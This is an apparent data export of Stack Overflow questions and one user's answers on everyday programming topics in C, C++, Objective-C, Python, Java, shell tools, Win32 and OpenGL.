"<p>I'm starting to develop for the iPhone. I have a beginner-type question, I'm sure:</p>

<p>I have this, which works:</p>

<pre><code>testLabel.text = [NSString stringWithFormat:@""%@ to %@"", testLabel.text, newLabelText];
</code></pre>

<p>I wish I could use the ""+="" operator, but I get a compile error (Invalid operands to binary +, have 'struct NSString *' and 'struct NSString *'):</p>

<pre><code>testLabel.text += [NSString stringWithFormat:@""to %@"", newLabelText];
</code></pre>

<p>Why can't I do this?  </p>

<p>Also, how can I shorten my first snippet of code?</p>
","9530","","<p>You can't use the <code>+=</code> operator because C and Objective-C do not allow operator overloading.  You're trying to use <code>+=</code> with two pointer types, which is not allowed -- if the left-hand side of a <code>+=</code> expression has a pointer type, then the right-hand side must be of an integral type, and the result is pointer arithmetic, which is not what you want in this case.</p>
"
"<p>The Leaks instrument tells me that I have a leak in this code fragment. Why is this so?</p>

<p>This code fragment is in <code>viewDidLoad()</code>.</p>

<pre><code>UINavigationItem *navItem=[self navigationItem];

UIBarButtonItem *addFeed = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemAdd target:self action:@selector(addFeed)];
[navItem setRightBarButtonItem:addFeed]; // leaks says that 128 bytes leaked
[addFeed release];

UIBarButtonItem *reload = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemRefresh  target:self action:@selector(reload)];
[navItem setLeftBarButtonItem:reload]; // leaks says that 128 bytes leaked here too !
[reload release];
[navItem release];
</code></pre>
","9530","","<p>The leaks instrument only tells you where the leaked memory was allocated; it can't tell you where the memory should have been released but wasn't since there's no possible way for it to know that.  Your leak is occurring elsewhere.</p>

<p>This code is mostly fine, except you should not be releasing <code>navItem</code> at the end.  You are not an owner of it, since you didn't create it with a method named <code>alloc</code>, <code>new</code>, or <code>copy</code> in its name, so you should not release it.</p>
"
"<p>What, if anything, is the difference between these directives?</p>

<pre><code>#ifdef FOO

#if defined FOO

#if defined(FOO)
</code></pre>

<p>I'm using the CCS compiler, but I'm interested in other C compilers as well.</p>
","9530","","<p>All 3 forms are exactly equivalent and valid, according to the C99 standard.  Generally <code>#ifdef</code> is preferred because it is shorter than the other two forms, but there are situations where you would want to use the other forms:</p>

<ul>
<li><p>If testing for the definitions of multiple symbols, or more complex expressions:</p>

<pre><code>#if defined(ONE_THING) &amp;&amp; define(ANOTHER_THING) &amp;&amp; (3 &lt; 4)
...
#endif
</code></pre></li>
<li><p>If you have multiple clauses, it's much easier to use <code>#elif defined(...)</code> than <code>#else</code>, <code>#ifdef</code>:</p>

<pre><code>#if defined(ONE_THING)
...
#elif defined(ANOTHER_THING)
...
#elif defined(THIRD_THING)
...
#else
...
#endif
</code></pre></li>
</ul>

<p>The usage of parentheses with <code>defined</code> is optional; I prefer using them to add clarity.</p>
"
"<p>I was wondering if it is possible to traverse a linked list like this:</p>

<p><pre><code>
currentNode = randomNode;//where randomNode may or may not = firstNode
prevNode = firstNode;
while(prevNode != currentNode && prevNode->link != currentNode)
{
    prevNode = prevNode->link;
}
</code></pre></p>

<p>Is it possible to do this in C++ when I am trying to find the node before currentNode in a singly linked list?</p>

<p>I trying to implement something like this in a console app for a school assignment so assume that I can't use anything fancy like the boost libraries/list/anything that makes life easier, etc. So basically, I have only fairly primitive datatypes and libraries at my disposal.</p>
","9530","","<p>Make sure you consider all of the possible edge cases:</p>

<ul>
<li>What happens <code>randomNode</code> equals <code>firstNode</code>?  What do you return?  What <em>should</em> you return?</li>
<li>What happens when <code>randomNode</code> is the last node in the list?</li>
<li>What happens when <code>randomNode</code> is <code>NULL</code>?</li>
<li>What happens when <code>randomNode</code> is not in the list?</li>
</ul>

<p>Now, not all of these cases may be applicable, depending on if you know anything about <code>randomNode</code>, and some of these may be trivial.  But they are all worth thinking about.</p>

<p>If you consider all of these very carefully, there is a simple and elegant solution that handles them all.</p>
"
"<p>I'm writing a utility to calculate π to a million digits after the decimal.  On a 32- or 64-bit consumer desktop system, what is the most efficient way to store and work with such a large number accurate to the millionth digit?</p>

<p>clarification: The language would be C.</p>
","9530","","<p>Unless you're writing this purely for fun and/or learning, I'd recommend using a library such as <a href=""http://gmplib.org/"" rel=""nofollow"">GNU Multiprecision</a>.  Look into the <code>mpf_t</code> data type and its associated functions for storing arbitrary-precision floating-point numbers.</p>

<p>If you are just doing this for fun/learning, then represent numbers as an array of <code>chars</code>, which each array element storing one decimal digit.  You'll have to implement long addition, long multiplication, etc.</p>
"
"<p>i m new here  . stackoverflow is a good place to help others and being helped.
so i post my problem here.i'va asked quite a few people and find no answers.</p>

<p>thanks</p>

<p>Use SelectObject() on your memory DC to select the bitmap into it.This makes me puzzled.
i read the msdn but still don't konw how to fill the second parameter of SelectObject().
help</p>
","9530","","<p>Call <a href=""http://msdn.microsoft.com/en-us/library/ms649048%28VS.85%29.aspx""><code>OpenClipbard()</code></a> to open the clipboard and call <a href=""http://msdn.microsoft.com/en-us/library/ms649039%28VS.85%29.aspx""><code>GetClipboardData()</code></a> with a type of <code>CF_BITMAP</code> to get the handle to the image data stored on the clipboard.  If there's no image on the clipboard, the NULL handle will be returned.</p>

<p>Then, inside your window's <code>WM_PAINT</code> handler, use <a href=""http://msdn.microsoft.com/en-us/library/dd183362%28VS.85%29.aspx""><code>BeginPaint()</code></a> to get a device context for drawing into your window, and use <a href=""http://msdn.microsoft.com/en-us/library/aa922550.aspx""><code>CreateCompatibleDC()</code></a> to create a memory device context for the bitmap.  Use <a href=""http://msdn.microsoft.com/en-us/library/aa932923.aspx""><code>SelectObject()</code></a> on your memory DC to select the bitmap into it, and finally use <a href=""http://msdn.microsoft.com/en-us/library/dd183370%28VS.85%29.aspx""><code>BitBlt()</code></a> to blit the bitmap from the memory DC onto the window's DC.  Don't forget to clean up -- call <a href=""http://msdn.microsoft.com/en-us/library/dd183533%28VS.85%29.aspx""><code>DeleteDC()</code></a> to delete the memory DC, and call <a href=""http://msdn.microsoft.com/en-us/library/dd162598%28VS.85%29.aspx""><code>EndPaint()</code></a> to end drawing.</p>

<p>Lastly, call <a href=""http://msdn.microsoft.com/en-us/library/ms649035%28VS.85%29.aspx""><code>CloseClipboard()</code></a> when you're done.  Note that the clipboard owns the bitmap handle, and as soon as you call <code>CloseClipboard()</code>, the bitmap will be destroyed.  So, if you want to hang onto the bitmap after you've closed the clipboard, you'll need to make a copy of it.</p>
"
"<p>I'd like to upgrade the default python installation (2.5.1) supplied with OS X Leopard to the latest version. Please let me know how I can achieve this.</p>

<p>Thanks</p>
","9530","","<p>You have a number of options</p>

<ul>
<li><p>Install with <a href=""http://www.macports.org/"" rel=""nofollow"">MacPorts</a> or <a href=""http://www.finkproject.org/"" rel=""nofollow"">Fink</a>, e.g.:</p>

<pre><code>sudo port install python2.6
</code></pre></li>
<li>Install from the disc image from <a href=""http://python.org/ftp/python/2.6.3/python-2.6.3-macosx.dmg"" rel=""nofollow"">python.org</a></li>
<li><p>Install from <a href=""http://python.org/ftp/python/2.6.3/Python-2.6.3.tgz"" rel=""nofollow"">source</a>:</p>

<pre><code>tar xzvf Python-2.6.3.tgz
cd Python-2.6.3
./configure &amp;&amp; make &amp;&amp; sudo make install
</code></pre></li>
</ul>
"
"<p>I'm writing a C++ class to read input from a file into preallocated buffers called ""chunks"".</p>

<p>I want the caller to be able to call a public static Chunk class method called <strong>GetNextFilledChunk()</strong>, which</p>

<ol>
<li>Grabs a Chunk from an inactive chunk pool</li>
<li>Fills the Chunk instance from the input stream using the Chunk's private member variables/functions</li>
<li>Returns a pointer to the Chunk to the caller</li>
</ol>

<p>But step 2 is giving me fits. No matter what I've tried, trying to get to the Chunk instance's private member variables/functions causes g++ 4.2.1 to emit errors.</p>

<p>Here's a piece of the class definition from the header file:</p>

<pre><code>class Chunk
{
public:
                        Chunk();
...
    static Chunk*       GetNextFilledChunk();
...

private:
...
    ssize_t             m_ActualTextSize;
};
</code></pre>

<p>And here's part of the source file that shows the problem:</p>

<pre><code>#include ""Chunk.h""


Chunk::
Chunk*  GetNextFilledChunk()
{
    ...
    theChunk = sInactiveChunks.top();
    sInactiveChunks.pop();
    ...
    theChunk-&gt;m_ActualTextSize = TextSize();    // PROBLEM IS HERE
    ...

    return theChunk;
}
</code></pre>

<p>As shown, g++ complains that GetNextFilledChunk() is trying to access a private member of Chunk.</p>

<p>Then I thought, maybe it needs to be a ""friend"". But everything I've tried to do in header file to make GetNextFilledChunk() a friend results in an error. For instance:</p>

<p>friend static Chunk*  GetNextFilledChunk();</p>

<p>results in ""Chunk.h:23: warning: ‘Chunk* GetNextFilledChunk()’ declared ‘static’ but never defined""</p>

<p>What I find truly bizarre is that if I simply make GetNextFilledChunk() a plain old function, not a static member function, I can ""friend"" it and everybody is happy. But that seems silly - why should one be able to do something in a class from a non-class function that can't be done from a static member function?</p>

<p>So... How can Chunk's s GetNextFilledChunk() function access private member variables of a Chunk instance?</p>

<p>And if it can't be done, is it an inherent part of C++, or simply a bug in g++?</p>
","9530","","<p>You're defining your member function wrong.  It should be defined like this:</p>

<pre><code>Chunk * Chunk::GetNextFilledChunk()
{
    ...
}
</code></pre>

<p>That the definition happened to compile fine was due to a quirk with the language: class names get inserted within their own namespaces, so <code>Chunk::Chunk</code> is equivalent to <code>Chunk</code>, so you were defining a global function by accident.</p>
"
"<p>I'm not sure if i need lamda, or something else. But still, i need following:</p>

<p>I have an array = [1,2,3,4,5]</p>

<p>I need to put this array, for instance, into another array. But write it all in one line.</p>

<pre><code>for item in array:
    array2.append (item)
</code></pre>

<p>I know that this is completely possible to iterate through the items and make it one-line. But googling and reading manuals didn't help me that much... if you can just give me a hint or name this thing so that i could find what that is, i would really appreciate it.</p>

<p>Python geeks, pls help)</p>

<p>UPD:
let's say this: array2 = SOME FANCY EXPRESSION THAT IS GOING TO GET ALL THE DATA FROM THE FIRST ONE</p>

<p>(example is NOT real. i'm just trying to iterate through different chunks of data, but that's the best i could come up with) </p>
","9530","","<p>The keyword you're looking for is <a href=""http://www.python.org/dev/peps/pep-0202/"">list comprehensions</a>:</p>

<pre><code>&gt;&gt;&gt; x = [1, 2, 3, 4, 5]
&gt;&gt;&gt; y = [2*a for a in x if a % 2 == 1]
&gt;&gt;&gt; print(y)
[2, 6, 10]
</code></pre>
"
"<p>Is there a way to make grep output ""words"" from files that match the search expression?</p>

<p>If I want to find all the instances of, say, ""th"" in a number of files you do;</p>

<p>grep ""th"" *</p>

<p>but the output will be something like (bold is by me);</p>

<p>some-text-file : <strong>the</strong> cat sat on <strong>the</strong> mat<br />
some-other-text-file : <strong>the</strong> quick brown fox<br />
yet-another-text-file : i hope <strong>this</strong> explains it <strong>thoroughly</strong>  </p>

<p>What I want it to output, using the same search, is;</p>

<p>the<br />
the<br />
the<br />
this<br />
thoroughly  </p>

<p>Is it possible? Or using another/combination of tools?</p>

<p>Thanks,</p>

<p>Neil</p>
","9530","","<p>You could translate spaces to newlines and then grep, e.g.:</p>

<pre><code>cat * | tr ' ' '\n' | grep th
</code></pre>
"
"<p>as in the title, what's the difference because these two seem to get me the same results?</p>
","9530","","<p>The increment <code>++</code> has higher operator precedence than the dereference <code>*</code>, so <code>*d++</code> increments the pointer <code>d</code> to point to the next location within the array, but the result of <code>++</code> is the original pointer <code>d</code>, so <code>*d</code> returns the original element being pointed to.  Conversely, <code>(*d)++</code> just increments the value being pointed to.</p>

<p>Example:</p>

<pre><code>// Case 1
int array[2] = {1, 2};
int *d = &amp;array[0];
int x = *d++;
assert(x == 1 &amp;&amp; d == &amp;array[1]);  // x gets the first element, d points to the second

// Case 2
int array[2] = {1, 2};
int *d = &amp;array[0];
int x = (*d)++;
assert(x == 1 &amp;&amp; d == &amp;array[0] &amp;&amp; array[0] == 2);
// array[0] gets incremented, d still points there, but x receives old value
</code></pre>
"
"<p>I'm having trouble declaring a C Array as an Objective-C Property (You know @property, and @synthesize so I can use dot syntax)...Its just a 3 dimensional int array..</p>
","9530","","<p>You can't -- arrays are not lvalues in C.  You'll have to declare a pointer property instead and rely on code using the correct arraybounds, or instead use an <code>NSArray</code> property.</p>

<p>Example:</p>

<pre><code>@interface SomeClass
{
    int width, height, depth;
    int ***array;
}

- (void) initWithWidth:(int)width withHeight:(int)height withDepth:(int)depth;
- (void) dealloc;

@property(nonatomic, readonly) array;
@end

@implementation SomeClass

@synthesize array;

 - (void) initWithWidth:(int)width withHeight:(int)height withDepth:(int)depth
{
    self-&gt;width  = width;
    self-&gt;height = height;
    self-&gt;depth  = depth;
    array = malloc(width * sizeof(int **));
    for(int i = 0; i &lt; width; i++)
    {
        array[i] = malloc(height * sizeof(int *));
        for(int j = 0; j &lt; height; j++)
            array[i][j] = malloc(depth * sizeof(int));
    }
}

- (void) dealloc
{
    for(int i = 0; i &lt; width; i++)
    {
        for(int j = 0; j &lt; height; j++)
            free(array[i][j]);
        free(array[i]);
    }
    free(array);
}

@end
</code></pre>

<p>Then you can use the <code>array</code> property as a 3-dimensional array.</p>
"
"<p>I've heard many times that Linus Torvalds is a genius when it comes to writing good code. I also wish to write good code and I'd like to see how the first version of Linux was written. </p>

<p>Does anyone know where I can find the first version of Linux? I'm looking for the first version (not 1.0) because I think it will be smaller and easier to understand.</p>

<p>Many thanks.</p>
","9530","","<p>You can find archives of all versions of the Linux kernel on <a href=""http://www.kernel.org"" rel=""nofollow"">www.kernel.org</a>.  Version 1.0 can be found <a href=""http://www.kernel.org/pub/linux/kernel/v1.0/"" rel=""nofollow"">here</a>, and earlier versions can be found <a href=""http://www.kernel.org/pub/linux/kernel/Historic/"" rel=""nofollow"">here</a>.  They can also be accessed by <a href=""http://git-scm.com/"" rel=""nofollow"">git</a>.</p>

<p>If you want to see a much simpler kernel, I suggest taking a look at <a href=""http://minnie.tuhs.org/UnixTree/V6/"" rel=""nofollow"">Unix v6</a>.</p>
"
"<p>So, I am confused about how jump instructions work in an operating system. I thought that the jump instruction set the value in the processor's program counter. But programs can be run in various locations in memory. I see that in x86, there's the <code>JMP EAX</code> instruction, but my C++ code doesn't seem to use this. I compiled some C++ code in VC++:</p>

<pre><code>int main()
{
    int i = 0;
    while (i &lt; 10)
    {
    	++i;
    	if (i == 7)
    	{
    		i += 1;
    		continue;
    	}
    }
}
</code></pre>

<p>This translates to:</p>

<pre><code>    int main()
    {
00411370  push        ebp  
00411371  mov         ebp,esp 
00411373  sub         esp,0CCh 
00411379  push        ebx  
0041137A  push        esi  
0041137B  push        edi  
0041137C  lea         edi,[ebp-0CCh] 
00411382  mov         ecx,33h 
00411387  mov         eax,0CCCCCCCCh 
0041138C  rep stos    dword ptr es:[edi] 
        int i = 0;
0041138E  mov         dword ptr [i],0 
        while (i &lt; 10)
00411395  cmp         dword ptr [i],0Ah 
00411399  jge         main+47h (4113B7h) 
        {
      	    ++i;
0041139B  mov         eax,dword ptr [i] 
0041139E  add         eax,1 
004113A1  mov         dword ptr [i],eax 
    	    if (i == 7)
004113A4  cmp         dword ptr [i],7 
004113A8  jne         main+45h (4113B5h) 
    	    {
    		    i += 1;
004113AA  mov         eax,dword ptr [i] 
004113AD  add         eax,1 
004113B0  mov         dword ptr [i],eax 
    		    continue;
004113B3  jmp         main+25h (411395h) 
    	    }
        }
004113B5  jmp         main+25h (411395h) 
    }
004113B7  xor         eax,eax 
004113B9  pop         edi  
004113BA  pop         esi  
004113BB  pop         ebx  
004113BC  mov         esp,ebp 
004113BE  pop         ebp  
004113BF  ret
</code></pre>

<p>So I'm confused, for the command <code>jmp 411395h</code>, does this imply the program is always loaded in the same spot in memory? Because that seems illogical.</p>
","9530","","<p>No.  On x86 (and other architectures, too), most jump instructions are <em>IP-relative</em>: the binary machine codes for the instructions represent an offset from the current instruction pointer.  So, no matter what virtual address the code gets loaded at, the jump instructions function correctly.</p>
"
"<p>Ever since I learned about -j I've used -j8 blithely.  The other day I was compiling an atlas installation and the make failed.  Eventually I tracked it down to things being made out of order - and it worked fine once I went back to singlethreaded make.  This makes me nervous.  What sort of conditions do I need to watch for when writing my own make files to avoid doing something unexpected with make -j?</p>
","9530","","<p>If you have a recursive make, things can break pretty easily.  If you're not doing a recursive make, then as long as your dependencies are correct and complete, you shouldn't run into any problems (save for a bug in make).  See <a href=""http://miller.emu.id.au/pmiller/books/rmch/"">Recursive Make Considered Harmful</a> for a much more thorough description of the problems with recursive make.</p>
"
"<p>I have two classes Hello1 and Hello, and I'm calling class Hello1 constructor within Hello class, but when I trying to compile the Hello class with command </p>

<p>javac Hello.java</p>

<p>I'm getting compile time error:</p>

<pre><code>Hello.java:6:cannot find the symbol
symbol: class Hello1
location: class Hello
Hello1=new Hello();
^
Hello.java:6:cannot find the symbol
symbol: class Hello1
location: class Hello
Hello1=new Hello();
           ^
</code></pre>

<p>But when I try to compile the compile the class with  command:</p>

<p><strong>javac Hello.java Hello1.java</strong></p>

<p>it's working fine, but why I have to use this command every time to compile the class? Why the compiler can't use the already compiled .class Hello1 file, so that next time I use the command javac Hello.java. </p>
","9530","","<p>You need to add the current directory to your classpath so the compiler can find it.  By default, the classpath does not include the current working directory, so any .class files which have already been compiled won't be seen by the compiler.  To do this, compile like this:</p>

<pre><code>javac Hello.java -cp .
</code></pre>
"
"<p>There is a program I need to launch multiple times and pass it different arguments each time. To do this I tried writing a simple python script as follows:</p>

<pre><code>import sys, os
from os.path import join

# This works, but will not launch twice
os.system('./AppName.app -AppCommandLineArg')

# This allows launching two instances but without command line arguments
os.system('open --new --background ./AppName.app')

# Attempt #1
os.system('open --new --background ./AppName.app -AppCommandLineArg')

# Attempt #2
os.system('open --new --background ""./AppName.app -AppCommandLineArg""')

# Attempt #3
os.system('open --new --background ""./AppName.app/Contents/MacOS/AppName -AppCommandLineArg""')
</code></pre>

<p>The reason I'm using 'open' is to be able to launch the app multiple time. Is 'open' the correct command to use? Any suggestions on how to do this? Working with linux/mac is very new to me.</p>

<p>Thanks!</p>

<p>Edit - Here is the code that solved the problem for me:</p>

<pre><code>p0   = subprocess.Popen(['./AppName.app/Contents/MacOS/AppName', '-AppCommandLineArg'])
p1   = subprocess.Popen(['./AppName.app/Contents/MacOS/AppName', '-AppCommandLineArg'])
</code></pre>

<p>Cheers!</p>
","9530","","<p>Yes, <code>open</code> is the correct way of launching applications on Mac OS X.  See the <a href=""http://developer.apple.com/mac/library/documentation/Darwin/Reference/ManPages/man1/open.1.html"" rel=""nofollow"">man page</a> for more information.  I'm not on a Mac right now, so I can't test this, but I believe the following should work:</p>

<pre><code>os.system('open -n ./AppName.app --args -AppCommandLineArg')
</code></pre>
"
"<p>Supposing I have the following type from an external library:</p>

<pre><code>union foreign_t {
    struct {
        enum enum_t an_enum;
        int an_int;
    } header;
    struct {
        double x, y;
    } point;
};
</code></pre>

<p>is it safe to assume the following code fragment will work as expected on different platforms and with different compilers?</p>

<pre><code>struct pair_t {
    double x, y;
};

union foreign_t foreign;
struct pair_t *p_pair;

p_pair = (struct pair_t *) &amp;foreign;
p_pair-&gt;x = 1234;
p_pair-&gt;y = 4321;

/* Expected result: (1234, 4321) or something like that */
printf(""(%lf, %lf)"", foreign.point.x, foreign.point.y);
</code></pre>

<p><hr /></p>

<h3>EDIT:</h3>

<p>Following the strict aliasing suggestion I made the following test:</p>

<pre><code>#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;

int main()
{
    uint16_t word = 0xabcd;
    uint8_t tmp;
    struct {
        uint8_t low;
        uint8_t high;
    } *byte = (void *) &amp;word;

    tmp = byte-&gt;low;
    byte-&gt;low = byte-&gt;high;
    byte-&gt;high = tmp;

    printf(""%x\n"", word);

    return 0;
}
</code></pre>

<p>The above apparently innocent piece of code is not reliable:</p>

<pre><code>$ gcc -O3 -fno-strict-aliasing -otest test.c
$ ./test
cdab
$ gcc -O3 -fstrict-aliasing -otest test.c
$ ./test
abcd
</code></pre>

<p>No peace for developers...</p>
","9530","","<p>As you have written it, I believe it should work with virtually any compiler on any architecture.  However, I do think it technically violates the <a href=""http://cellperformance.beyond3d.com/articles/2006/06/understanding-strict-aliasing.html"" rel=""nofollow"">strict aliasing</a> rules.  You're casting between unrelated pointer types, so an overly aggressive optimizer might reorder certain memory reads and writes because it assumes that certain pointers won't alias each other.</p>

<p>Unfortunately, I don't think there's a way to make this code absolutely bulletproof against strict aliasing, assuming that you can't modify the definition of <code>foreign_t</code>.  Since the inner struct doesn't have a name, there's no way you can construct a pointer to it that the compiler will assume is aliasable.  In practice, though, I don't think you'll see problems with your code.</p>
"
"<p>What benefit or implications could we get with Python code like this:</p>

<pre><code>class some_class(parent_class):
    def doOp(self, x, y):
        def add(x, y):
            return x + y
        return add(x, y)
</code></pre>

<p>I found this in an open-source project, doing something useful inside the nested function, but doing absolutely nothing outside it except calling it. (The actual code can be found <a href=""http://bazaar.launchpad.net/~openerp/openobject-server/trunk/annotate/1861/bin/report/render/rml2pdf/trml2pdf.py#L685"">here</a>.) Why might someone code it like this? Is there some benefit or side effect for writing the code inside the nested function rather than in the outer, normal function?</p>
","9530","","<p>Normally you do it to make <em><a href=""http://en.wikipedia.org/wiki/Closure%5F%28computer%5Fscience%29"">closures</a></em>:</p>

<pre><code>def make_adder(x):
    def add(y):
        return x + y
    return add

plus5 = make_adder(5)
print(plus5(12))  # prints 17
</code></pre>

<p>Inner functions can access variables from the enclosing scope (in this case, the local variable <code>x</code>).  If you're not accessing any variables from the enclosing scope, they're really just ordinary functions with a different scope.</p>
"
"<p>I want to rotate a CGPoint on the screen depending on the angle and the rotation is anchored on another point. Was wondering what is the most efficient way of doing this?</p>
","9530","","<p>Use a <a href=""http://en.wikipedia.org/wiki/Rotation%5Fmatrix"">2D rotation matrix</a>.  If you want to rotate a point counterclockwise about the origin by an angle of <code>angle</code>, then you would do this:</p>

<pre><code>CGPoint RotatePointAboutOrigin(CGPoint point, float angle)
{
    float s = sinf(angle);
    float c = cosf(angle);
    return CGPointMake(c * point.x - s * point.y, s * point.x + c * point.y);
}
</code></pre>

<p>If you want to rotate about a point other than the origin, you'll have to first subtract the center of rotation from your point, rotate it using the above, and then add back in the center of rotation (this is called <em>conjugation</em> in matrix theory).</p>
"
"<p>One can create an anonymous object that is initialized through constructor parameters, such as in the return statement, below.</p>

<pre><code>struct S {
  S(int i_, int j_) : i(i_), j(j_) { }
  int i, j;
};

S f()
{
  return S(52, 100);
}

int main()
{
  cout &lt;&lt; f().i &lt;&lt; endl;
  return 0;
}
</code></pre>

<p>However, can one similarly create an anonymous <i>aggregate</i> that is initialized with a brace initializer? For example, can one collapse the body of f(), below, down to a single return statement without an ""s?""</p>

<pre><code>struct S {
  int i, j;
};

S f()
{
  S s = { 52, 100 };
  return s;
}

int main()
{
  cout &lt;&lt; f().i &lt;&lt; endl;
  return 0;
}
</code></pre>
","9530","","<p>Not in C++.  But you can in C99, using so-called <em>compound literals</em>:</p>

<pre><code>struct S {
  int i, j;
};

struct S F()
{
  // Valid C99, invalid C++:
  return (struct S){ 52, 100 };
}
</code></pre>

<p>[C99: §6.5.2, 6.5.2.5]<br />
[C++98: §5.2.3, 8.5, 12.1, 12.2]</p>

<p>Some C++ compilers provide this as an extension, but it's not legal ISO C++98.  For example, g++ will accept this code by default, but if you compile with the <code>-pedantic</code> option, it will reject it.</p>
"
"<p>I want to create a C macro that creates a function with a name based
on the line number.
I thought I could do something like (the real function would have statements within the braces):</p>

<pre><code>#define UNIQUE static void Unique_##__LINE__(void) {}
</code></pre>

<p>Which I hoped would expand to something like:</p>

<pre><code>static void Unique_23(void) {}
</code></pre>

<p>That doesn't work. With token concatenation, the positioning macros
are treated literally, ending up expanding to:</p>

<pre><code>static void Unique___LINE__(void) {}
</code></pre>

<p>Is this possible to do?</p>

<p>(Yes, there's a real reason I want to do this no matter how useless this seems).</p>
","9530","","<p>The problem is that when you have a macro replacement, the preprocessor will only expand the macros recursively if neither the stringizing operator <code>#</code> nor the token-pasting operator <code>##</code> are applied to it.  So, you have to use some extra layers of indirection, you can use the token-pasting operator with a recursively expanded argument:</p>

<pre><code>#define TOKENPASTE(x, y) x ## y
#define TOKENPASTE2(x, y) TOKENPASTE(x, y)
#define UNIQUE static void TOKENPASTE2(Unique_, __LINE__)(void) {}
</code></pre>

<p>Then, <code>__LINE__</code> gets expanded to the line number during the expansion of <code>UNIQUE</code> (since it's not involved with either <code>#</code> or <code>##</code>), and then the token pasting happens during the expansion of <code>TOKENPASTE</code>.</p>

<p>It should also be noted that there is also the <code>__COUNTER__</code> macro, which expands to a new integer each time it is evaluated, in case you need to have multiple instantiations of the <code>UNIQUE</code> macro on the same line. Note: <code>__COUNTER__</code> is supported by MS Visual Studio and GCC (since V4.3), but is not standard C.</p>
"
"<p>So I have 2 classes, Bullet and Ship, that are dependent on each other, hence circular inclusion. Since I have Ship's interface #included into Bullet's interface, the obvious decision was to forward declare Bullet to Ship.</p>

<p>However, when I first tried this I still got compiler errors. I read up a bit on forward declaration and realized that I was constructing a Bullet in one of Ship's methods, and Bullet's default constructor is member initialized, which (and I may be wrong) wouldn't work because a forward class declaration doesn't allow Ship to see definitions in the interface (i.e. member initialization). </p>

<p>So I decided I could give up the member init and just defined the constructor in Bullet's implementation file, however I still receive the same problem with circular dependency.</p>

<p>The message in particular is <code>invalid use of undefined type struct Bullet</code>.</p>

<p>I could just put the interface for Bullet and Ship in the same file, but that's kind of a last resort. Any assistance regarding this problem is appreciated. Thanks.</p>

<p>Here is the spot where the error occurs:</p>

<pre><code>case SDLK_UP: // Fire
{
    Bullet(*this) fired_bullet; // Create bullet. Line where error occurs.
    fired_bullet.Move(); // Move bullet
    break;
}
</code></pre>

<p>Bullet's default constructor takes an argument of the Ship that is firing the bullet, and that code is in a Ship method.</p>
","9530","","<p>You'll have to move the definitions out of your headers into your source files, leaving only the declarations in the headers.  It should look something like this:</p>

<pre><code>// Ship.h
class Bullet;
class Ship
{
    // Declare stuff, using only pointers/references to Bullet instances
    Ship();
    ...
};

// Bullet.h
class Ship;
class Bullet
{
    // Declare stuff, using only pointers/references to Ship instances
    Bullet(const Ship &amp; ship);
    ...
};

// Ship.cpp
#include ""Bullet.h""
#include ""Ship.h""

// Ship definitions
Ship::Ship()
{
    ...
}
...

// Bullet.cpp
#include ""Bullet.h""
#include ""Ship.h""

// Bullet definitions
Bullet::Bullet(const Ship &amp; ship)
{
    ...
}
...
</code></pre>

<p>Finally, your syntax for instantiating a Bullet is wrong.  You should be instantiating it like this:</p>

<pre><code>Bullet fired_bullet(*this);
</code></pre>
"
"<p>I'd like to code in some preprocessor macros to optionally log some information.  For example in the .h</p>

<pre><code>//#define ML_DEBUG(x) (x)  // flip this bit to do the error logging
#define ML_DEBUG(x) (1==1) // flip this bit to silence
</code></pre>

<p>in the .m I implement like:</p>

<pre><code>ML_DEBUG(NSLog(@""Class dealloc: %@"", [NSString stringWithCString:object_getClassName(self)]));
</code></pre>

<p>The code works fine as I have presented it.  However I don't think my ""do nothing"" case is as light weight as it could be.  I had expected to write:</p>

<pre><code>//#define ML_DEBUG(x) (x)  // flip this bit to do the error logging
#define ML_DEBUG(x) (;) // flip this bit to silence
</code></pre>

<p>Since a lone semicolon is a valid objective-c statement, I expected this would work, but the compiler is telling me:</p>

<pre><code>expected expression before ';' token
</code></pre>

<p>My question is:  did I choose the most lightweight ""do nothing"" statement, by using 1==1 or is there  a less intensive way to do this.  Or maybe my entire approach to temporary debug logging is wrong-headed?</p>
","9530","","<p>The simplest thing is an empty definition:</p>

<pre><code>#define ML_DEBUG(x)
</code></pre>

<p>This works for most cases, but it does not work with the ternary operator, e.g.:</p>

<pre><code>something ? ML_DEBUG(x) : ML_DEBUG(y);
</code></pre>

<p>In order to work for this (admittedly contrived) example, you can do this:</p>

<pre><code>#define ML_DEBUG(x) ((void)0)
</code></pre>

<p>It's perfectly valid to cast things to void -- it says to the compiler that you're explicitly ignoring the result of the expression.</p>

<p>It's for this reason that the standard ANSI C macro <code>assert()</code> gets turned into <code>((void)0)</code> when <code>NDEBUG</code> is defined instead of the empty statement.</p>
"
"<p>I've got a list of directories that contain spaces.</p>

<p>I need to surround them with ' ' to ensure that my batch scripts will work.</p>

<p>How can one surround each new line with a ' and a ' (quotes).</p>

<p>e.g.</p>

<p>File1:</p>

<pre><code>/home/user/some type of file with spaces
/home/user/another type of file with spaces
</code></pre>

<p>To</p>

<p>File2:</p>

<pre><code>'/home/user/some type of file with spaces'
'/home/user/another type of file with spaces'
</code></pre>
","9530","","<p>You can use <a href=""http://linux.die.net/man/1/sed"" rel=""nofollow"">sed(1)</a> to insert single quotes at the beginning and end of each line in a file as so:</p>

<pre><code>sed -i~ -e ""s/^/'/;s/$/'/"" the_file
</code></pre>
"
"<p>Just what it says:  I have some code that's drawing GLUT cubes, but they're all grey.  How do I make them different colors?</p>

<p>Everything I've tried so far has failed.  I think my problem is that I'm trying to use OpenGL functions to change their colors, but GLUT is maintaining it's own internal color or material data and I don't know how to make it change that data.</p>

<p>This is just filler graphics for a test-client for an online game, so they don't have to look good, I just need to be able to tell things apart.  I know GLUT isn't considered great, so if anyone wants to post an example of drawing a cube with plain OpenGL instead of glutCube I'm all ears.  I don't really care how I get the cubes on the screen, and it's not a part of the code I want to spend a lot of time on.  I have a partner who's doing the real graphics; I just need to get something showing so that I can visualize what my code is doing.</p>

<p>The language I'm using OpenGL/GLUT from is called Io, but the API it exposes should be the same as if I were calling it from C.</p>
","9530","","<p>Just set the color beforehand with <a href=""http://www.opengl.org/documentation/specs/man%5Fpages/hardcopy/GL/html/gl/color.html"" rel=""nofollow""><code>glColor()</code></a>.  If you're using lighting (i.e. <code>GL_LIGHTING</code> is enabled), though, then you'll instead have to use <a href=""http://www.opengl.org/documentation/specs/man%5Fpages/hardcopy/GL/html/gl/material.html"" rel=""nofollow""><code>glMaterial()</code></a> to set the cube's color.</p>
"
